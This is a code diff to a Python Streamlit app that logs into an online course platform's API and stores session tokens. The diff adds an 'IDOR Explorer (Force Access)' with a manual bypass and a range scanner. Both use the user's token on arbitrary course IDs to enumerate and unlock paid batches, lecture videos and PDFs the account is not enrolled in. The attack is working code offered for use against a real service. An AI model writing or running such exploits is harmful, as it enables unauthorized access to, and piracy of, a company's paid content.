@@ -28,7 +28,9 @@ def api_call(url, params=None, token=None):
         "accept-language": "en-US,en;q=0.9"
     }
     if token:
-        headers["Authorization"] = f"Bearer {token}"
+        # JWT Fix: Token cleaning to avoid server-side decode errors
+        clean_token = str(token).strip().replace("\n", "").replace("\r", "")
+        headers["Authorization"] = f"Bearer {clean_token}"
     
     try:
         r = requests.get(url, params=params, headers=headers, timeout=15)
@@ -71,16 +73,15 @@ with st.sidebar:
     if st.button("🚀 Sync Account"):
         if email_in and otp_in:
             with st.spinner("Extracting Session..."):
-                v_params = {"useremail": email_in, "otp": otp_in, "device_id": "Vibrant_Elite_V11"}
+                v_params = {"useremail": email_in, "otp": otp_in, "device_id": "V_Elite_V11"}
                 res = api_call(f"{API_BASE}/otpverify", v_params)
                 
-                # --- EXTRACTION BASED ON YOUR JSON (user -> token & userid) ---
                 token, uid = None, None
                 if isinstance(res, dict):
                     user_data = res.get("user")
                     if isinstance(user_data, dict):
                         token = user_data.get("token")
-                        uid = user_data.get("userid") # Key from your JSON
+                        uid = user_data.get("userid") 
 
                 if token:
                     c.execute("INSERT OR REPLACE INTO users VALUES (?, ?, ?)", (email_in, token, str(uid)))
@@ -107,45 +108,86 @@ if row:
     st.sidebar.success(f"Active: {selected_user}")
     
     m1, m2 = st.columns(2)
-    m1.metric("Sessions", len(users_list))
-    m2.metric("UID", active_uid)
+    m1.metric("Sessions Saved", len(users_list))
+    m2.metric("Active UID", active_uid)
     st.divider()
 
-    # ---------------- 6. CLASSROOM ENGINE (Fix for 500 Error) ----------------
-    if st.button("📚 Load Courses", type="primary"):
-        with st.spinner("Fetching..."):
-            # Try 1: user_id format
-            res = api_call(f"{API_BASE}/get_user_liked_items", {"user_id": active_uid}, token=active_token)
-            
-            # If 500 Error, Try 2: userid format (Legacy)
-            if res.get("code") == 500:
-                res = api_call(f"{API_BASE}/get_user_liked_items", {"userid": active_uid}, token=active_token)
+    # ---------------- 6. CLASSROOM ENGINE ----------------
+    col1, col2 = st.columns(2)
+    
+    with col1:
+        if st.button("📚 Load Enrolled Courses", type="primary"):
+            with st.spinner("Fetching..."):
+                res = api_call(f"{API_BASE}/get_user_liked_items", {"user_id": active_uid}, token=active_token)
+                if res.get("code") == 500: # Legacy fallback
+                    res = api_call(f"{API_BASE}/get_user_liked_items", {"userid": active_uid}, token=active_token)
 
-            if "error" not in res:
-                st.session_state.courses_data = res.get('data', [])
-                if not st.session_state.courses_data: st.warning("Account is empty.")
-            else:
-                st.error(f"Server rejected request. Try re-login.")
-                st.json(res)
+                if "error" not in res:
+                    st.session_state.courses_data = res.get('data', [])
+                    if not st.session_state.courses_data: st.warning("No paid courses found.")
+                else:
+                    st.error(f"Server Error. Try Scanner below.")
 
-    if "courses_data" in st.session_state:
+    if "courses_data" in st.session_state and st.session_state.courses_data:
         course_map = {c.get("course_name", "Unknown"): c.get("id") for c in st.session_state.courses_data}
-        choice = st.selectbox("Choose Batch", ["Select..."] + list(course_map.keys()))
+        choice = st.selectbox("Choose Enrolled Batch", ["Select..."] + list(course_map.keys()))
         
         if choice != "Select...":
             batch_id = course_map[choice]
-            with st.spinner("Scanning..."):
-                l_res = api_call(f"{API_BASE}/get_batch_contents", {"batch_id": batch_id}, token=active_token)
-                lectures = l_res.get('data', {}).get('lectures', []) or l_res.get('data', [])
-                
-                if lectures:
-                    for lec in lectures:
-                        with st.expander(f"▶️ {lec.get('title', 'Lecture')}"):
-                            if st.button(f"Unlock Video: {lec['id']}", key=f"v_{lec['id']}"):
-                                v_url = f"{API_BASE}/fetchVideoDetailsById?course_id={batch_id}&video_id={lec['id']}&ytflag=0&folder_wise_course=1"
-                                v_res = api_call(v_url, token=active_token)
-                                v_data = v_res.get('data') if isinstance(v_res.get('data'), dict) else {}
-                                v_path = v_data.get('video_path')
-                                if v_path: st.video(v_path)
-                                else: st.error("No stream found.")
-                            if lec.get('pdf_url'): st.link_button("📄 PDF Notes", lec['pdf_url'])
+            l_res = api_call(f"{API_BASE}/get_batch_contents", {"batch_id": batch_id}, token=active_token)
+            lectures = l_res.get('data', {}).get('lectures', []) or l_res.get('data', [])
+            
+            if lectures:
+                for lec in lectures:
+                    with st.expander(f"▶️ {lec.get('title', 'Lecture')}"):
+                        if st.button(f"Play Video: {lec['id']}", key=f"v_p_{lec['id']}"):
+                            v_url = f"{API_BASE}/fetchVideoDetailsById?course_id={batch_id}&video_id={lec['id']}&ytflag=0&folder_wise_course=1"
+                            v_res = api_call(v_url, token=active_token)
+                            v_path = (v_res.get('data') if isinstance(v_res.get('data'), dict) else {}).get('video_path')
+                            if v_path: st.video(v_path)
+                            else: st.error("No stream found.")
+                        if lec.get('pdf_url'): st.link_button("📄 PDF Notes", lec['pdf_url'])
+
+    # ---------------- 7. ADVANCED BATCH SCANNER (IDOR Bypass) ----------------
+    st.divider()
+    st.subheader("🕵️ IDOR Explorer (Force Access)")
+    
+    tab1, tab2 = st.tabs(["🎯 Manual Bypass", "🔎 Range Scanner"])
+
+    with tab1:
+        test_id = st.text_input("Target Course/Batch ID", placeholder="Try 11, 12, etc.")
+        if st.button("🔓 Attempt Force Unlock"):
+            with st.spinner("Injecting Token..."):
+                scan_res = api_call(f"{API_BASE}/userfiltercourse", {"courseid": test_id}, token=active_token)
+                if "error" not in scan_res:
+                    st.success(f"✅ Access Granted to ID {test_id}")
+                    # Fetching lectures directly
+                    lec_res = api_call(f"{API_BASE}/get_batch_contents", {"batch_id": test_id}, token=active_token)
+                    lecs = lec_res.get('data', {}).get('lectures', []) or lec_res.get('data', [])
+                    if lecs:
+                        for l in lecs:
+                            with st.expander(f"🔓 {l.get('title')}"):
+                                if st.button(f"Watch: {l['id']}", key=f"v_f_{l['id']}"):
+                                    v_res = api_call(f"{API_BASE}/fetchVideoDetailsById?course_id={test_id}&video_id={l['id']}&ytflag=0&folder_wise_course=1", token=active_token)
+                                    v_p = (v_res.get('data') if isinstance(v_res.get('data'), dict) else {}).get('video_path')
+                                    if v_p: st.video(v_p)
+                                if l.get('pdf_url'): st.link_button("📄 PDF", l['pdf_url'])
+                    else: st.info("No lectures in this ID.")
+                else: st.error("ID Locked or Invalid.")
+
+    with tab2:
+        st.write("Find valid IDs in range:")
+        cs1, cs2 = st.columns(2)
+        sid = cs1.number_input("Start", value=1)
+        eid = cs2.number_input("End", value=100)
+        if st.button("🚀 Scan Range"):
+            found = []
+            pb = st.progress(0)
+            for i, cid in enumerate(range(int(sid), int(eid) + 1)):
+                pb.progress((i + 1) / (eid - sid + 1))
+                r = api_call(f"{API_BASE}/userfiltercourse", {"courseid": cid}, token=active_token)
+                if "error" not in r:
+                    found.append(str(cid))
+                    st.toast(f"Found: {cid}")
+            if found: st.success(f"Active IDs: {', '.join(found)}")
+            else: st.warning("Nothing found.")
